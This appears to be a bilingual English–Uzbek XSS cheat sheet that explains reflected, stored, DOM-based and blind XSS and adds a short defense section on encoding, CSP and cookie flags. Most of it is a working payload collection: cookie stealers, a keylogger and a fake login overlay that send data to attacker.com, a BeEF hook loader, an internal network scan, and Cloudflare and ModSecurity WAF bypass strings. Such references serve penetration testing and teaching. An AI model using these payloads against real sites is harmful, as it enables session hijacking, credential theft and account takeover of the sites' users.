# 🛡️ XSS Attack Cheat Sheet / XSS Hujumlari Bo'yicha Qo'llanma

> **EN:** A comprehensive, bilingual reference guide for understanding Cross-Site Scripting (XSS) vulnerabilities, payload types, and real-world attack scenarios. For educational and ethical security research purposes only.
>
> **UZ:** Cross-Site Scripting (XSS) zaifliklarini, payload turlarini va real dunyo hujum stsenariylarini tushunish uchun keng qamrovli ikki tilli qo'llanma. Faqat ta'lim va axloqiy xavfsizlik tadqiqoti maqsadida.

---

> ⚠️ **Disclaimer / Ogohlantirish**
> EN: This material is strictly for educational purposes. Unauthorized use against systems you do not own is illegal.
> UZ: Ushbu material faqat ta'lim maqsadida. Ruxsatsiz tizimlarга hujum qilish noqonuniy.

---

## 📋 Table of Contents / Mundarija

| # | Section (EN) | Bo'lim (UZ) |
|---|---|---|
| 1 | [What is XSS?](#1-what-is-xss--xss-nima) | XSS nima? |
| 2 | [How XSS Works](#2-how-xss-works--xss-qanday-ishlaydi) | XSS qanday ishlaydi? |
| 3 | [XSS Types](#3-xss-types--xss-turlari) | XSS turlari |
| 4 | [Payload Types](#4-payload-types--payload-turlari) | Payload turlari |
| 5 | [Context-Based Payloads](#5-context-based-payloads--kontekst-boyicha-payloadlar) | Kontekst bo'yicha payloadlar |
| 6 | [Filter Bypass Techniques](#6-filter-bypass-techniques--filtr-chetlab-otish) | Filtr chetlab o'tish |
| 7 | [WAF Bypass](#7-waf-bypass) | WAF Bypass |
| 8 | [Real-World Attack Scenarios](#8-real-world-attack-scenarios--real-dunyo-hujum-stsenariylari) | Real dunyo stsenariylari |
| 9 | [Defense / Himoya](#9-defense--himoya) | Himoya usullari |
| 10 | [Tools](#10-tools--vositalar) | Vositalar |
| 11 | [CTF Tips](#11-ctf-tips) | CTF maslahatlar |

---

## 1. What is XSS? / XSS Nima?

**EN:** Cross-Site Scripting (XSS) is a client-side injection vulnerability where an attacker injects malicious scripts into web pages viewed by other users. The browser executes the malicious script as if it were legitimate code from the trusted site.

**UZ:** Cross-Site Scripting (XSS) — bu mijoz tomonidagi injection zaifligi bo'lib, tajovuzkor boshqa foydalanuvchilar ko'radigan veb-sahifalarga zararli skriptlar kiritadi. Brauzer bu zararli skriptni ishonchli saytdan kelgan qonuniy kod sifatida bajaradi.

```
Attacker           Vulnerable Website         Victim Browser
    |                      |                        |
    |--- Injects Script --> |                        |
    |                      |--- Serves Infected --> |
    |                      |       Page             |
    |                      |                 Executes Script
    |<========= Stolen Data (Cookies, Tokens) =======|
```

---

## 2. How XSS Works / XSS Qanday Ishlaydi?

**EN:** XSS exploits the browser's trust in content served from a domain. The attack flow:
1. Attacker finds an input field that reflects data back to the page
2. Injects a malicious script payload
3. Victim visits the page, browser executes the payload
4. Attacker gains access to victim's session, data, or device

**UZ:** XSS domendan kelgan kontentga brauzerning ishonchini suiiste'mol qiladi:
1. Tajovuzkor ma'lumotlarni sahifaga qaytaradigan kiritish maydonini topadi
2. Zararli skript payload kiritadi
3. Qurbon sahifaga kiradi, brauzer payloadni bajaradi
4. Tajovuzkor qurbonning sessiyasi, ma'lumotlari yoki qurilmasiga kirish huquqini oladi

---

## 3. XSS Types / XSS Turlari

### 3.1 Reflected XSS

```
┌─────────────────────────────────────────────────────────┐
│                   REFLECTED XSS FLOW                    │
│                                                         │
│  Attacker ──► Crafts URL ──► Sends to Victim            │
│                                   │                     │
│                              Victim clicks              │
│                                   │                     │
│                         Server reflects payload         │
│                                   │                     │
│                         Browser executes script         │
│                                   │                     │
│                    Data sent back to attacker           │
└─────────────────────────────────────────────────────────┘
```

**EN:** The payload is included in the URL or request and immediately reflected back in the response. Not stored on the server. Requires social engineering (sending malicious link to victim).

**UZ:** Payload URL yoki so'rovga kiritiladi va darhol javobda aks ettiriladi. Serverda saqlanmaydi. Ijtimoiy muhandislik talab qiladi (qurbonga zararli havola yuborish).

**Example / Misol:**
```
# Vulnerable URL
https://example.com/search?q=<script>alert('XSS')</script>

# Server Response
<p>Search results for: <script>alert('XSS')</script></p>
```

**Real-world target / Haqiqiy nishon:** Search bars, error messages, login forms

---

### 3.2 Stored XSS (Persistent)

```
┌─────────────────────────────────────────────────────────┐
│                    STORED XSS FLOW                      │
│                                                         │
│  Attacker ──► Injects Payload ──► Database/Storage      │
│                                         │               │
│                              Any user visits the page   │
│                                         │               │
│                         Server fetches & renders        │
│                         payload from database           │
│                                         │               │
│                    Browser executes – ALL victims hit   │
└─────────────────────────────────────────────────────────┘
```

**EN:** The payload is permanently stored on the server (database, log files, comments). Every user who views the infected page gets attacked. Most dangerous type.

**UZ:** Payload serverda (ma'lumotlar bazasi, jurnal fayllar, izohlar) doimiy ravishda saqlanadi. Zararlangan sahifani ko'rgan har bir foydalanuvchi hujumga uchraydi. Eng xavfli tur.

**Example / Misol:**
```html
<!-- Comment field input -->
<script>
  fetch('https://attacker.com/steal?c=' + document.cookie)
</script>

<!-- Stored in DB, served to all visitors -->
```

**Real-world target / Haqiqiy nishon:** Blog comments, forum posts, profile fields, chat messages

---

### 3.3 DOM-Based XSS

```
┌─────────────────────────────────────────────────────────┐
│                   DOM-BASED XSS FLOW                    │
│                                                         │
│  Server sends SAFE HTML page                            │
│            │                                            │
│  Browser loads page                                     │
│            │                                            │
│  JavaScript reads from:                                 │
│   document.location / window.location.hash             │
│   document.referrer / document.URL                     │
│            │                                            │
│  Writes to DOM without sanitization:                    │
│   innerHTML / document.write / eval()                  │
│            │                                            │
│  Payload executes IN BROWSER — server never sees it     │
└─────────────────────────────────────────────────────────┘
```

**EN:** The vulnerability exists in client-side JavaScript. The server sends a safe page, but the browser's own scripts process untrusted data and write it to the DOM insecurely.

**UZ:** Zaiflik mijoz tomonidagi JavaScriptda mavjud. Server xavfsiz sahifa yuboradi, lekin brauzerning o'z skriptlari ishonchsiz ma'lumotlarni qayta ishlaydi va xavfsiz bo'lmagan tarzda DOMga yozadi.

**Dangerous Sources / Xavfli manbalar:**
```javascript
document.URL
document.location
document.location.href
document.location.hash     // #fragment – never sent to server!
document.referrer
window.name
localStorage / sessionStorage
```

**Dangerous Sinks / Xavfli qabul qiluvchilar:**
```javascript
element.innerHTML = userInput        // ❌ Dangerous
document.write(userInput)            // ❌ Dangerous
eval(userInput)                      // ❌ Dangerous
setTimeout(userInput)                // ❌ Dangerous
element.src = userInput              // ❌ Dangerous
```

**Example / Misol:**
```javascript
// Vulnerable code
const name = document.location.hash.slice(1);
document.getElementById('greeting').innerHTML = 'Hello ' + name;

// Attack URL
https://example.com/page#<img src=x onerror=alert(1)>
```

---

### 3.4 Blind XSS

**EN:** A type of stored XSS where the attacker cannot see the output directly. The payload executes in an admin panel, internal dashboard, or backend system that the attacker doesn't have access to.

**UZ:** Stored XSS turi bo'lib, tajovuzkor chiqishni to'g'ridan-to'g'ri ko'ra olmaydi. Payload admin panelda, ichki boshqaruv panelidagi yoki tajovuzkor kira olmaydigan backend tizimida bajariladi.

```
Attacker injects blind payload
        │
        ▼
Stored in DB (attacker gets no feedback)
        │
        ▼
Admin opens ticket/log/report
        │
        ▼
Payload fires in ADMIN's browser
        │
        ▼
Admin cookies/session sent to attacker ← High Value Target!
```

**Tools for Blind XSS / Vositalar:**
- [XSS Hunter](https://xsshunter.com) — Callback service that notifies when payload fires
- [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator)

---

## 4. Payload Types / Payload Turlari

### 4.1 Basic / Classic Payloads

```html
<!-- Basic alert -->
<script>alert('XSS')</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>

<!-- Cookie stealer -->
<script>
  new Image().src = 'https://attacker.com/?c=' + encodeURIComponent(document.cookie);
</script>

<!-- Using fetch -->
<script>
  fetch('https://attacker.com/?c=' + btoa(document.cookie));
</script>
```

---

### 4.2 Event Handler Payloads

```html
<!-- Image error -->
<img src=x onerror="alert('XSS')">
<img src=x onerror=alert`1`>

<!-- SVG onload -->
<svg onload="alert('XSS')">
<svg/onload=alert(1)>

<!-- Body onload -->
<body onload="alert('XSS')">

<!-- Mouse events -->
<div onmouseover="alert('XSS')">Hover me</div>
<input autofocus onfocus="alert('XSS')">
<select autofocus onfocus="alert('XSS')">
<textarea autofocus onfocus="alert('XSS')">

<!-- Video/Audio -->
<video src=x onerror="alert('XSS')">
<audio src=x onerror="alert('XSS')">

<!-- Details/Summary -->
<details open ontoggle="alert('XSS')">
```

---

### 4.3 Polyglot Payloads

**EN:** A single payload that works in multiple contexts simultaneously.
**UZ:** Bir vaqtda bir nechta kontekstda ishlaydigan yagona payload.

```javascript
// Classic polyglot
javascript:/*--></title></style></textarea></script></xmp>
<svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>

// Gareth Heyes polyglot
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

// Short polyglot
'"><img src=x onerror=alert(1)>

// Attribute-breaking polyglot
" autofocus onfocus=alert(1) "
```

---

## 5. Context-Based Payloads / Kontekst Bo'yicha Payloadlar

### 5.1 HTML Context

```html
<!-- Breaking out of text -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### 5.2 Attribute Context

```html
<!-- Input value: <input value="USER_INPUT"> -->
" onmouseover="alert(1)
" autofocus onfocus="alert(1)
"><script>alert(1)</script>

<!-- Unquoted attribute: <input value=USER_INPUT> -->
x onmouseover=alert(1)
x/onmouseover=alert(1)
```

### 5.3 JavaScript Context

```javascript
// Inside string: var x = "USER_INPUT";
"; alert(1); var y = "
'-alert(1)-'
\'; alert(1);//

// Inside script block without string
; alert(1)//
```

### 5.4 CSS Context

```css
/* style="USER_INPUT" */
color:red;} body{background:url('javascript:alert(1)')
expression(alert(1))   /* IE only */
```

### 5.5 URL/href Context

```javascript
// href="USER_INPUT"
javascript:alert(1)
javascript:alert`1`
data:text/html,<script>alert(1)</script>
```

---

## 6. Filter Bypass Techniques / Filtr Chetlab O'tish

### 6.1 Case Variation / Harf o'yinlari

```html
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>
<sCrIpT>alert(1)</sCrIpT>
<img SrC=x OnErRoR=alert(1)>
```

### 6.2 Encoding / Kodlash

```html
<!-- HTML Entities -->
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
&lt;script&gt;alert(1)&lt;/script&gt;

<!-- URL Encoding -->
%3Cscript%3Ealert(1)%3C%2Fscript%3E

<!-- Double URL Encoding -->
%253Cscript%253Ealert(1)%253C%252Fscript%253E

<!-- Unicode Escapes (in JS context) -->
\u0061lert(1)      // alert(1)
\u0061\u006cert(1)
```

### 6.3 Tag Tricks / Teg hiylalari

```html
<!-- Spaces and slashes -->
<img/src=x onerror=alert(1)>
<img	src=x onerror=alert(1)>   <!-- Tab character -->
<img %09src=x onerror=alert(1)>   <!-- Encoded tab -->

<!-- Null bytes (some parsers) -->
<scri%00pt>alert(1)</scri%00pt>
<scri\x00pt>alert(1)</scri\x00pt>

<!-- Broken/unclosed tags -->
<script
>alert(1)</script>

<!-- Comment insertion -->
<scr<!---->ipt>alert(1)</scr<!---->ipt>

<!-- Alternate script types -->
<script type="text/javascript">alert(1)</script>
<script language="javascript">alert(1)</script>
```

### 6.4 JavaScript Obfuscation

```javascript
// String construction
eval(String.fromCharCode(97,108,101,114,116,40,49,41))

// Bracket notation
window['ale'+'rt'](1)
window['\x61lert'](1)

// Template literals
alert`1`

// Destructuring / indirect call
[].constructor.constructor('alert(1)')()

// btoa/atob
eval(atob('YWxlcnQoMSk='))
```

---

## 7. WAF Bypass

**EN:** Web Application Firewalls (WAF) block common XSS patterns. These techniques help bypass them.
**UZ:** Veb-ilovalar xavfsizlik devori (WAF) umumiy XSS patternlarini bloklaydi. Bu usullar ularni chetlab o'tishga yordam beradi.

```html
<!-- Cloudflare bypass examples -->
<svg/onload=location=`javas`+`cript:ale`+`rt%281%29`>
<svg onload=alert%26%230000000040%261)>

<!-- ModSecurity bypass -->
<a href="j&#x41;vascript:alert(1)">click</a>
<a href="&#106;avascript:alert(1)">click</a>

<!-- Generic WAF evasion -->
<img src="x" onerror="&#97;lert(1)">
<script>window['al\x65rt'](1)</script>

<!-- Newline injection -->
<script>
alert(1)
</script>

<!-- Comment abuse -->
<img src=x on/**/error=alert(1)>
```

---

## 8. Real-World Attack Scenarios / Real Dunyo Hujum Stsenariylari

### 8.1 Cookie / Session Theft — Brute-force-siz sessiyani o'g'irlash

```
┌──────────────────────────────────────────────────────────────┐
│                  SESSION HIJACKING ATTACK                    │
│                                                              │
│  1. Victim logs into bank.com → gets session cookie          │
│                                                              │
│  2. Attacker injects XSS in comment section:                 │
│     <script>                                                 │
│       fetch('https://evil.com/steal?c='+document.cookie)     │
│     </script>                                                │
│                                                              │
│  3. Victim reads a comment → script fires in background      │
│                                                              │
│  4. Attacker receives:                                       │
│     sessionId=abc123; authToken=xyz789                       │
│                                                              │
│  5. Attacker replays cookies → Full account access ✓         │
└──────────────────────────────────────────────────────────────┘
```

**Payload:**
```javascript
<script>
  var img = new Image();
  img.src = "https://attacker.com/log?cookie=" 
            + encodeURIComponent(document.cookie)
            + "&host=" + document.domain;
</script>
```

**Real Case:** Samy Worm (MySpace, 2005) — 1 million accounts infected in 20 hours

---

### 8.2 Keylogger

```javascript
<script>
  document.addEventListener('keypress', function(e) {
    fetch('https://attacker.com/keys?k=' + encodeURIComponent(e.key) 
          + '&page=' + encodeURIComponent(window.location.href));
  });
</script>
```

**EN Use Case:** Inject into banking login page → capture username + password as user types
**UZ:** Bank login sahifasiga kiritiladi → foydalanuvchi yozayotganda login + parolni ushlab oladi

---

### 8.3 Phishing Overlay (Sahifani almashtirish)

```javascript
<script>
// Replace login form with fake one
document.body.innerHTML = `
  <div style="position:fixed;top:0;left:0;width:100%;height:100%;
              background:white;z-index:9999">
    <h2>Session expired. Please login again.</h2>
    <form action="https://attacker.com/harvest" method="POST">
      <input name="user" placeholder="Username">
      <input name="pass" placeholder="Password" type="password">
      <button>Login</button>
    </form>
  </div>
`;
</script>
```

---

### 8.4 CSRF + XSS Combination

```javascript
<script>
// XSS bypasses SameSite cookie protection
// Make authenticated request on behalf of victim
fetch('/api/change-email', {
  method: 'POST',
  credentials: 'include',    // sends victim's cookies
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({email: 'attacker@evil.com'})
});
</script>
```

**EN:** XSS makes CSRF token bypass unnecessary — attacker executes requests from within the victim's browser context.
**UZ:** XSS CSRF tokenini chetlab o'tishni keraksiz qiladi — tajovuzkor so'rovlarni qurbonning brauzer kontekstidan bajaradi.

---

### 8.5 BeEF Framework Attack

```
┌─────────────────────────────────────────────────────────┐
│              BeEF HOOKED BROWSER ATTACK                 │
│                                                         │
│  XSS Payload:                                           │
│  <script src="http://attacker.com:3000/hook.js"></script>│
│                                                         │
│  Once hooked, attacker can:                             │
│  ├── Steal credentials & cookies                        │
│  ├── Take webcam snapshots                              │
│  ├── Port scan internal network                         │
│  ├── Redirect browser                                   │
│  ├── Fake update popups                                 │
│  ├── Clipboard hijacking                                │
│  └── Social engineering attacks                         │
└─────────────────────────────────────────────────────────┘
```

---

### 8.6 XSS → Internal Network Pivot

```javascript
<script>
// Scan internal network from victim's browser
for(let i = 1; i <= 254; i++) {
  fetch(`http://192.168.1.${i}`, {mode:'no-cors'})
    .then(() => {
      new Image().src = `https://attacker.com/found?ip=192.168.1.${i}`;
    });
}
</script>
```

---

## 9. Defense / Himoya

### 9.1 Input Validation

```javascript
// Server-side validation
function sanitizeInput(input) {
  return input
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
    .replace(/\//g, '&#x2F;');
}
```

### 9.2 Output Encoding

| Context | Encoding Method |
|---------|----------------|
| HTML Body | `&lt;` `&gt;` `&amp;` `&quot;` |
| HTML Attribute | `&#xHH;` format |
| JavaScript | `\uXXXX` unicode escapes |
| CSS | `\HH` hex escapes |
| URL | `%XX` percent encoding |

### 9.3 Content Security Policy (CSP)

```http
# Strict CSP header
Content-Security-Policy: 
  default-src 'self';
  script-src 'self' 'nonce-{RANDOM}';
  object-src 'none';
  base-uri 'self';
  frame-ancestors 'none';
```

```html
<!-- CSP Nonce usage -->
<script nonce="abc123xyz">
  // Only this script block executes
  doSomething();
</script>
```

### 9.4 HttpOnly & Secure Cookies

```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

| Flag | Protection |
|------|-----------|
| `HttpOnly` | JavaScript cannot access cookie → blocks cookie theft |
| `Secure` | Cookie only sent over HTTPS |
| `SameSite=Strict` | Blocks cross-site cookie sending → mitigates CSRF |

### 9.5 Trusted Types API (Modern Browsers)

```javascript
// Force all DOM writes to go through a sanitizer
trustedTypes.createPolicy('default', {
  createHTML: (dirty) => DOMPurify.sanitize(dirty)
});

// Now this will throw if policy doesn't allow it:
element.innerHTML = userInput;  // Goes through sanitizer
```

---

## 10. Tools / Vositalar

| Tool | Type | Purpose / Maqsad |
|------|------|----------|
| [XSStrike](https://github.com/s0md3v/XSStrike) | Active Scanner | Smart XSS detection with fuzzing |
| [Dalfox](https://github.com/hahwul/dalfox) | Fast Scanner | Fast param-based XSS scanner |
| [XSSer](https://github.com/epsylon/xsser) | Framework | Automated XSS exploitation |
| [Burp Suite](https://portswigger.net/burp) | Proxy | Intercept, scan, and test |
| [XSS Hunter](https://xsshunter.com) | Blind XSS | Blind XSS callback platform |
| [BeEF](https://beefproject.com) | Framework | Browser exploitation framework |
| [DOMPurify](https://github.com/cure53/DOMPurify) | Defense | Client-side HTML sanitizer |
| [OWASP ZAP](https://www.zaproxy.org) | Scanner | Open-source web app scanner |

---

## 11. CTF Tips

**EN:** Common XSS challenge patterns in CTFs:
**UZ:** CTFlarda keng tarqalgan XSS muammo naqshlari:

```javascript
// Challenge: alert() is blocked
// Solution: Use confirm() or prompt()
<img src=x onerror=confirm(1)>
<img src=x onerror=prompt(1)>

// Challenge: Parentheses blocked
// Solution: Template literals
<img src=x onerror=alert`1`>

// Challenge: Script word blocked
// Solution: Event handlers
<img src=x onerror=alert(1)>

// Challenge: Spaces blocked
// Solution: Tab or slash
<img/src=x/onerror=alert(1)>

// Challenge: Quotes blocked
// Solution: No quotes needed
<img src=x onerror=alert(1)>

// Challenge: < and > blocked but inside JS string
// Solution: Unicode escapes
\u003cimg src=x onerror=alert(1)\u003e

// Challenge: innerHTML sink, < blocked
// Solution: Use existing DOM
location='javascript:alert(1)'

// Challenge: Restricted charset (only [a-zA-Z0-9])
// Solution: JSFuck encoding
[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]
```

---

## 📚 References / Manbalar

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger XSS Learning](https://portswigger.net/web-security/cross-site-scripting)
- [PayloadsAllTheThings - XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [HackTricks XSS](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)
- [XSS Polyglots](https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)

---

## ⚖️ Legal Notice / Qonuniy Eslatma

**EN:** This guide is for authorized security testing, bug bounties, CTF competitions, and education only. Always get written permission before testing. Unauthorized testing is a criminal offense.

**UZ:** Bu qo'llanma faqat ruxsatlangan xavfsizlik testlari, bug bounty, CTF musobaqalari va ta'lim uchundir. Testlashdan oldin har doim yozma ruxsat oling. Ruxsatsiz test o'tkazish jinoiy javobgarlikka tortiladi.

---

*Made with ❤️ for the security community | Xavfsizlik hamjamiyati uchun ❤️ bilan tayyorlandi*
